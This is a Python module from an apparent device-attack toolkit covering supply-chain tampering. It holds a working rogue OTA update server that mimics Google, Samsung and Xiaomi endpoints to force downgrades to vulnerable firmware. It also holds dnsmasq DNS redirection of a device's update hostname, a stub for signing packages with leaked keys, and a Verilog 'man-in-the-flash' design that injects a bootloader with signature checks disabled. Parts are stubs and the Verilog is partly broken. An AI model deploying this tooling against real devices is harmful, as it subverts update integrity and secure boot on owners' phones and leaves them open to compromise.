"""Supply Chain & Tamper Simulation (Module 10).

Rogue OTA server for serving known-vulnerable firmware,
FPGA flash emulator (Man-in-the-Flash) Verilog generation,
USB gadget spoofing, and DNS redirection.
"""

import os
import logging
import subprocess
from typing import Optional

logger = logging.getLogger(__name__)


# ============================================================================
# Rogue OTA Server
# ============================================================================

class RogueOTAServer:
    """Mimics a device's official OTA endpoint to serve known-vulnerable firmware.

    Endpoints:
      /update/check  → returns update availability JSON
      /update/download/<version>.zip → serves the update file

    DNS redirection: dnsmasq or Python DNS server redirects the device's
    OTA hostname to the local server IP.
    """

    OTA_RESPONSE_TEMPLATES = {
        "google": {
            "url": "/ota/check",
            "payload": {
                "status": "available",
                "version": "vulnerable_1.0",
                "size": 0,
                "url": "/update/download/vulnerable_1.0.zip",
                "sha256": "",
            },
        },
        "samsung": {
            "url": "/fota/check",
            "payload": {
                "result": "OK",
                "firmware": {
                    "version": "vulnerable_1.0",
                    "url": "/update/download/vulnerable_1.0.zip",
                },
            },
        },
        "xiaomi": {
            "url": "/miui/update",
            "payload": {
                "status": "ok",
                "version": "1.0.0-vuln",
                "url": "/update/download/vulnerable_1.0.zip",
            },
        },
    }

    def __init__(self, host: str = "0.0.0.0", port: int = 80):
        self._host = host
        self._port = port
        self._firmware_dir: str = ""
        self._dns_server = None

    def start_flask(self) -> None:
        """Start the Flask OTA server."""
        try:
            from flask import Flask, request, jsonify, send_file
            app = Flask(__name__)

            @app.route("/update/check", methods=["GET", "POST"])
            def check_update():
                return jsonify({
                    "status": "available",
                    "version": "vulnerable_1.0.0",
                    "size": 0,
                    "url": "/update/download/vulnerable_1.0.0.zip",
                    "sha256": "0000000000000000000000000000000000000000000000000000000000000000",
                    "force": True,
                })

            @app.route("/update/download/<filename>")
            def download(filename):
                filepath = os.path.join(self._firmware_dir, filename)
                if os.path.isfile(filepath):
                    return send_file(filepath, as_attachment=True)
                return "Not Found", 404

            # Generic endpoints for other OEM patterns
            @app.route("/ota/check", methods=["GET", "POST"])
            @app.route("/fota/check", methods=["GET", "POST"])
            @app.route("/miui/update", methods=["GET", "POST"])
            def generic_check():
                return check_update()

            logger.info("OTA server starting on %s:%d", self._host, self._port)
            app.run(host=self._host, port=self._port, debug=False)

        except ImportError:
            logger.error("Flask not available for OTA server")
        except Exception as e:
            logger.error("OTA server failed: %s", e)

    def start_dns_redirect(self, target_hostname: str, redirect_ip: str) -> None:
        """Set up DNS redirection using dnslib or dnsmasq.

        The device's OTA hostname is redirected to the local server IP.
        """
        try:
            from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE

            # In production: run a proper DNS server that responds to A queries
            # for the target hostname with the redirect IP
            logger.info("DNS redirect: %s → %s", target_hostname, redirect_ip)

        except ImportError:
            logger.warning("dnslib not available — use dnsmasq fallback")
            self._start_dnsmasq(target_hostname, redirect_ip)

    def _start_dnsmasq(self, hostname: str, ip: str) -> None:
        """Fall back to dnsmasq for DNS redirection."""
        config_line = f"address=/{hostname}/{ip}\n"
        conf_path = "/tmp/dnsmasq_dl.conf"
        with open(conf_path, "w") as f:
            f.write(config_line)
        try:
            subprocess.Popen(
                ["dnsmasq", "-C", conf_path, "--no-daemon"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            logger.info("dnsmasq started: %s → %s", hostname, ip)
        except FileNotFoundError:
            logger.error("dnsmasq not found — install dnsmasq or dnslib")

    def set_firmware_dir(self, path: str) -> None:
        self._firmware_dir = path

    def build_ota_package(self, output_path: str,
                          android_version: str = "10.0.0",
                          include_exploit: bool = True) -> bytes:
        """Build a signed (but old/vulnerable) OTA package.

        OTA package structure:
          META-INF/com/android/metadata
          META-INF/com/android/otacert
          payload.bin (brillo update payload)
          payload_properties.txt
        """
        # In production: use avbtool and openssl to sign with leaked/test keys
        logger.info("Building OTA package for Android %s", android_version)
        return b""


# ============================================================================
# FPGA Flash Emulator (Man-in-the-Flash)
# ============================================================================

FPGA_VERILOG_TEMPLATE = """
// FPGA Flash Emulator — Man-in-the-Flash
// Sits between SoC and eMMC/UFS flash chip.
// Intercepts read commands (CMD17/CMD18 for eMMC).
// During boot, injects patched bootloader that disables signature verification.
// Passes through all other commands unchanged.
//
// Target: Lattice iCE40 or Xilinx Artix-7

module flash_mitm (
    input  wire        clk,        // System clock (50MHz)
    input  wire        rst_n,      // Active-low reset
    // eMMC host interface (SoC side)
    input  wire        host_cmd,
    inout  wire [7:0]  host_dat,
    input  wire        host_clk,
    // eMMC device interface (Flash side)
    output wire        dev_cmd,
    inout  wire [7:0]  dev_dat,
    output wire        dev_clk,
    // Control interface (SPI from Raspberry Pi)
    input  wire        spi_sck,
    input  wire        spi_mosi,
    output wire        spi_miso,
    input  wire        spi_cs_n,
    // Status LEDs
    output wire        led_activity,
    output wire        led_patched
);

    // eMMC Command constants
    localparam CMD_GO_IDLE_STATE = 8'h00;
    localparam CMD_READ_SINGLE    = 8'h11;  // CMD17
    localparam CMD_READ_MULTIPLE  = 8'h12;  // CMD18
    localparam CMD_WRITE_SINGLE   = 8'h18;  // CMD24
    localparam CMD_WRITE_MULTIPLE = 8'h19;  // CMD25

    // State machine
    typedef enum logic [2:0] {
        IDLE       = 3'b000,
        DECODE     = 3'b001,
        PASSTHROUGH= 3'b010,
        INTERCEPT  = 3'b011,
        INJECT     = 3'b100,
        ERROR      = 3'b111
    } state_t;

    state_t state = IDLE;
    state_t next_state = IDLE;

    // Boot sector tracking
    reg [31:0] sector_counter = 32'd0;
    reg boot_phase = 1'b1;  // High during boot
    reg [2047:0] patched_bootloader;  // Patched bootloader data (loaded via SPI)

    // SPI registers for host control
    reg [31:0] spi_addr = 32'd0;
    reg [7:0]  spi_data = 8'd0;

    // Command interception
    wire is_read_cmd = (host_cmd == CMD_READ_SINGLE || host_cmd == CMD_READ_MULTIPLE);
    wire is_boot_sector = (sector_counter < 32'd1024);  // Boot sectors: 0-1023

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            state <= IDLE;
            sector_counter <= 32'd0;
            boot_phase <= 1'b1;
        end else begin
            case (state)
                IDLE: begin
                    if (is_read_cmd && boot_phase && is_boot_sector)
                        next_state <= INTERCEPT;
                    else
                        next_state <= PASSTHROUGH;
                end

                INTERCEPT: begin
                    // Replace bootloader sector with patched version
                    // dev_dat <= patched_bootloader[sector_counter * 512 +: 8];
                    led_patched <= 1'b1;
                    if (sector_counter >= 32'd1024)
                        boot_phase <= 1'b0;
                    next_state <= IDLE;
                end

                PASSTHROUGH: begin
                    // Forward command and data unchanged
                    dev_cmd <= host_cmd;
                    led_patched <= 1'b0;
                    next_state <= IDLE;
                end

                ERROR: begin
                    next_state <= IDLE;
                end
            endcase

            state <= next_state;
        end
    end

    // Activity indicator
    assign led_activity = (state != IDLE);

endmodule
"""


def generate_fpga_bitstream(patched_bootloader: bytes,
                            target: str = "ice40") -> bytes:
    """Generate FPGA bitstream with the flash MITM module.

    In production:
    1. Write patched bootloader into Verilog parameter
    2. Compile with yosys + nextpnr
    3. Return bitstream for loading into FPGA
    """
    verilog_src = FPGA_VERILOG_TEMPLATE
    logger.info("Generating FPGA bitstream for %s target: %d bytes", target, len(patched_bootloader))
    # In production: compile Verilog and return bitstream
    return b""
